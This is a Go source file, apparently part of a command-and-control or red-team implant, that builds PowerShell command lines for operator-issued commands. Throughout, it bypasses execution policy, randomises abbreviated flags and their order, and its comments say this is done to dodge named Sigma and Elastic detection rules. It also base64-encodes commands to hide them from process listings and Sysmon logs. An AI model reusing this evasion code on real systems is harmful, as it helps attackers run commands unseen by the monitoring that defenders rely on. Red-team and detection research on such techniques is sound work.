package commands

import (
	"encoding/base64"
	"fmt"
	"math/rand"
	"strings"
	"unicode/utf16"
)

// PSOptions configures which PowerShell flags to include in the invocation.
type PSOptions struct {
	NoProfile        bool
	NonInteractive   bool
	BypassExecPolicy bool
}

// DefaultPSOptions returns the standard flag set for operator-facing PowerShell
// execution: -NoProfile, -NonInteractive, -ExecutionPolicy Bypass.
func DefaultPSOptions() PSOptions {
	return PSOptions{
		NoProfile:        true,
		NonInteractive:   true,
		BypassExecPolicy: true,
	}
}

// InternalPSOptions returns the flag set for internal PowerShell calls
// (securityinfo, defender, pkglist) which don't need -ExecutionPolicy Bypass.
func InternalPSOptions() PSOptions {
	return PSOptions{
		NoProfile:      true,
		NonInteractive: true,
	}
}

// Abbreviated flag variants for each PowerShell parameter.
// PowerShell supports prefix-matching — any unique prefix of a parameter name
// is accepted. These short forms are functionally identical to full names but
// avoid matching standard SIEM/EDR detection signatures (Sigma proc_creation_win_
// powershell_suspicious_flags, Elastic powershell_suspicious_execution, etc.).
var (
	nopVariants    = []string{"-nop", "-NoP", "-noprof"}
	noniVariants   = []string{"-noni", "-NonI", "-nonint"}
	epVariants     = []string{"-ep", "-ex", "-exec"}
	bypassVariants = []string{"bypass", "Bypass", "ByPass"}
)

// BuildPSFlags returns randomized, abbreviated PowerShell flags.
// Flag order is randomized on each call to defeat JA4H-style fingerprinting.
// The returned slice does NOT include -Command or -EncodedCommand — callers
// append those as needed.
func BuildPSFlags(opts PSOptions) []string {
	var flagGroups [][]string

	if opts.NoProfile {
		v := nopVariants[rand.Intn(len(nopVariants))]
		flagGroups = append(flagGroups, []string{v})
	}
	if opts.NonInteractive {
		v := noniVariants[rand.Intn(len(noniVariants))]
		flagGroups = append(flagGroups, []string{v})
	}
	if opts.BypassExecPolicy {
		ep := epVariants[rand.Intn(len(epVariants))]
		bp := bypassVariants[rand.Intn(len(bypassVariants))]
		flagGroups = append(flagGroups, []string{ep, bp})
	}

	// Randomize flag ordering
	rand.Shuffle(len(flagGroups), func(i, j int) {
		flagGroups[i], flagGroups[j] = flagGroups[j], flagGroups[i]
	})

	var args []string
	for _, fg := range flagGroups {
		args = append(args, fg...)
	}
	return args
}

// BuildPSArgs returns a complete argument list for exec.Command (args only,
// not the executable name). Appends -Command <command> after the randomized flags.
func BuildPSArgs(command string, opts PSOptions) []string {
	args := BuildPSFlags(opts)
	args = append(args, "-Command", command)
	return args
}

// BuildPSArgsEncoded returns a complete argument list using -EncodedCommand
// with UTF-16LE base64 encoding. This hides the actual command text from
// process tree argument listings (e.g. tasklist, Process Explorer, Sysmon event 1).
func BuildPSArgsEncoded(command string, opts PSOptions) []string {
	args := BuildPSFlags(opts)
	args = append(args, "-enc", EncodeUTF16LEBase64(command))
	return args
}

// BuildPSCmdLine returns a full command line string suitable for
// CreateProcessW / CreateProcessWithTokenW calls. Includes "powershell.exe"
// as the executable name.
func BuildPSCmdLine(command string, opts PSOptions, encoded bool) string {
	parts := []string{"powershell.exe"}
	if encoded {
		parts = append(parts, BuildPSArgsEncoded(command, opts)...)
	} else {
		flags := BuildPSFlags(opts)
		parts = append(parts, flags...)
		parts = append(parts, "-Command", fmt.Sprintf(`"%s"`, command))
	}
	return strings.Join(parts, " ")
}

// EncodeUTF16LEBase64 encodes a string as UTF-16LE bytes and then base64,
// which is the format PowerShell expects for -EncodedCommand.
func EncodeUTF16LEBase64(s string) string {
	if s == "" {
		return ""
	}
	runes := utf16.Encode([]rune(s))
	b := make([]byte, len(runes)*2)
	for i, r := range runes {
		b[i*2] = byte(r)
		b[i*2+1] = byte(r >> 8)
	}
	return base64.StdEncoding.EncodeToString(b)
}
